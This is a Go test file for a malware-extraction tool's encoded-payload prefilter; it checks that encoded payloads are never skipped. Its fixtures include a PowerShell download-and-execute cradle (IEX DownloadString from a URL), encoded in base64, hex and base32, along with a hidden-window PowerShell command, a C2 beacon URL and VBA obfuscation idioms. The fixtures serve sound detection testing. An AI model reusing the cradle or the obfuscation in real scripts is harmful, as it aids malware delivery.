// PERF-4 — tests for the cheap scalar pre-gate mayBeEncoded that fronts the
// decode chain (decode.go ~595) and looksEncoded. The pre-gate is a STRICT
// pre-filter: it may only skip work the decoders/looksEncoded would have found
// nothing in. A false negative (skipping a buffer that actually carries a
// decodable payload) = missed malware, so these tests focus on that direction.
package extract

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"
	"time"
)

// prefilterCorpus is the union of (a) inputs that MUST be decoded (carry a real
// payload / match a decoder or looksEncoded pattern) and (b) plain-prose inputs
// that legitimately may be skipped. The invariant tests below assert the strict
// pre-gate property over the whole corpus.
func prefilterCorpus(t *testing.T) []struct {
	name     string
	data     []byte
	mustGate bool // true => mayBeEncoded MUST return true (decodable / looksEncoded)
} {
	t.Helper()
	long := "the quick brown fox jumps over the lazy dog. "
	prose := strings.Repeat(long, 40) // ~1800 bytes of pure prose, no long run
	payload := "powershell -enc IEX(New-Object Net.WebClient).DownloadString('http://h/p')"

	cases := []struct {
		name     string
		data     []byte
		mustGate bool
	}{
		// --- must be gated through (decodable) ---
		{"base64_run", []byte(base64.StdEncoding.EncodeToString([]byte(payload))), true},
		{"hex_run", []byte(hex.EncodeToString([]byte(payload))), true},
		{"base32_run", []byte(base32.StdEncoding.EncodeToString([]byte(payload))), true},
		// netbios: 32+ A-P chars.
		{"netbios_run", []byte("ABCDEFGHIJKLMNOPABCDEFGHIJKLMNOP"), true},
		// Dridex: quoted >=20 alnum with a non-hex letter.
		{"dridex_literal", []byte(`x = "ZZQWMNBVCXALSKDJFHGZ123" + foo`), true},
		// \xHH escapes (8+).
		{"xesc", []byte(`buf=\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90`), true},
		// &HXX VBA hex.
		{"amph", []byte(`a=&H41,&H42,&H43,&H44,&H45,&H46,&H47,&H48,&H49`), true},
		// \uXXXX unicode escapes (8+ units).
		{"uesc", []byte(`x=\u0041\u0042\u0043\u0044\u0045\u0046\u0047\u0048`), true},
		// decimal sequence (12+ groups).
		{"decseq", []byte(`72,101,108,108,111,44,32,87,111,114,108,100,33`), true},
		// VBA Chr concat (has "chr").
		{"chr_concat", []byte(`x = Chr(72) & Chr(105) & Chr(33)`), true},
		// VBA string-literal-only concat (NO "chr" marker — needs quote+op path).
		{"strlit_concat", []byte(`x = "po" & "wer" & "shell"`), true},
		{"strlit_concat_plus", []byte(`x = "po" + "wer" + "shell"`), true},
		// VBA Replace.
		{"replace", []byte(`x = Replace("paxxxath", "xxx", "")`), true},
		// VBA StrReverse.
		{"strreverse", []byte(`x = StrReverse("llehsrewop")`), true},
		// VBA Environ.
		{"environ", []byte(`x = Environ("APPDATA")`), true},
		// reversed marker (no long run, lowercase substring).
		{"reversed_marker", []byte(`junk llehsrewop junk`), true},
		// payload embedded in prose (adversarial: mostly text + one real run).
		{"prose_plus_b64", []byte(prose + " " + base64.StdEncoding.EncodeToString([]byte(payload)) + " " + prose), true},

		// --- may legitimately be skipped (pure prose, no run, no marker) ---
		{"pure_prose", []byte(prose), false},
		{"short_words", []byte("hello world this is a short benign sentence."), false},
		{"empty", []byte(""), false},
	}
	out := make([]struct {
		name     string
		data     []byte
		mustGate bool
	}, len(cases))
	copy(out, cases)
	return out
}

// TestPrefilterStrictNoFalseNegative is the core soundness test: for EVERY
// corpus input, if looksEncoded would return true OR the input is flagged as
// decodable, mayBeEncoded MUST also return true. mayBeEncoded must never skip
// something the real path would have decoded.
func TestPrefilterStrictNoFalseNegative(t *testing.T) {
	for _, c := range prefilterCorpus(t) {
		gate := mayBeEncoded(c.data)
		// Invariant 1: looksEncoded(x) implies mayBeEncoded(x).
		if looksEncoded(c.data) && !gate {
			t.Errorf("%s: looksEncoded=true but mayBeEncoded=false (FALSE NEGATIVE)", c.name)
		}
		// Invariant 2: every must-gate input passes.
		if c.mustGate && !gate {
			t.Errorf("%s: must be gated through but mayBeEncoded=false (FALSE NEGATIVE)", c.name)
		}
	}
}

// TestPrefilterAdversarialPayloadRecovered crafts mostly-prose buffers that DO
// carry a real encoded payload (short, embedded, mixed-case, separator-flanked)
// and asserts the full extract path still recovers the cleartext IOC — i.e. the
// prefilter passed them through and the decoders fired.
func TestPrefilterAdversarialPayloadRecovered(t *testing.T) {
	prose := strings.Repeat("lorem ipsum dolor sit amet, ", 30)
	cases := []struct {
		name string
		ioc  string
	}{
		{"embedded_url", "http://malicious.example/c2/beacon.php?id=42"},
		{"embedded_ps", "powershell -nop -w hidden -enc DownloadString"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			enc := base64.StdEncoding.EncodeToString([]byte(c.ioc))
			// Bury the run in prose with separators on both sides.
			carrier := []byte(prose + "\n\t " + enc + " \n" + prose)
			if !mayBeEncoded(carrier) {
				t.Fatalf("prefilter skipped a buffer carrying a real base64 payload")
			}
			res := ExtractWithOptions(carrier, FullOptions(time.Time{}))
			if !streamsContain(res, c.ioc) {
				t.Errorf("IOC %q not recovered; prefilter may have over-skipped; streams=%d", c.ioc, len(res.Streams))
			}
		})
	}
}

// TestPrefilterDifferentialNoBehaviorChange asserts the pre-gate changes NO
// output: for inputs the gate skips (mayBeEncoded=false), the decode chain and
// looksEncoded must independently also produce nothing — so gating them is a
// pure no-op-elimination. Mirrors the differential shape of
// decode_differential_test.go: same corpus, assert WITH-gate == WITHOUT-gate.
func TestPrefilterDifferentialNoBehaviorChange(t *testing.T) {
	for _, c := range prefilterCorpus(t) {
		if mayBeEncoded(c.data) {
			continue // gate passes -> chain runs exactly as before, no skip to verify
		}
		// Gate skipped it. Prove the skip is sound: looksEncoded must be false
		// AND running the full decode chain directly must emit zero decoded
		// streams. If either fired, the gate dropped real work.
		if looksEncoded(c.data) {
			t.Errorf("%s: gate skipped but looksEncoded=true", c.name)
		}
		emitted := 0
		emit := func(b []byte) bool { emitted++; return true }
		var dl time.Time
		decodeBase64Runs(c.data, dl, emit)
		decodeHexRuns(c.data, dl, emit)
		emitReversed(c.data, emit)
		foldVBAStrings(c.data, dl, emit)
		decodeXEscRuns(c.data, dl, emit)
		decodeAmpHRuns(c.data, dl, emit)
		decodeUEscRuns(c.data, dl, emit)
		decodeDecSeqRuns(c.data, dl, emit)
		decodeNetbiosRuns(c.data, dl, emit)
		decodeBase32Runs(c.data, dl, emit)
		if emitted != 0 {
			t.Errorf("%s: gate skipped but decode chain emitted %d blob(s) — BEHAVIOR CHANGE", c.name, emitted)
		}
	}
}
